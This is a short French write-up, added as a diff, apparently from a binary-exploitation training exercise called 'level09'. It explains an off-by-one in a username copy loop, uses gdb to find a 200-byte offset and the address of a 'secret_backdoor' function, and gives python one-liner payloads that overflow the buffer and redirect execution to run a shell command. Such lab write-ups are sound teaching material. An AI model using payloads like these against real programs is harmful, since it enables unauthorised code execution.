@@ -1,0 +1,24 @@
+on voit que la boucle de copie a une erreur elle depasse de 1 pour le username donc on va tenter de le fr segfault
+
+(python -c 'print "A" * 40 + "\xff"'; cat) | ./level09
+
+le \xff est le byte maximum.
+
+on voit bien que ca segfault donc on copie notre chaine et on reft avec gdb pr trouver l offset via notre pattern
+
+apres avoir segfault on lance la commande 
+
+x/s $rsp
+ et on voit que on segfault au 200 eme charactere
+
+il nous faut mtn ds l addresse de la fonction secrete back door
+
+print secret_backdoor
+
+0x55555555488c
+
+on a plus qua fr notre exploit 
+
+(python -c 'print "W" * 40 + "\xff" + "\n" + "J" * 200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh/whoami"'; cat) | ./level09 
+
+on rajoute la commande a la fin pr remplir le buffer qui sera appler par system ds la backoor
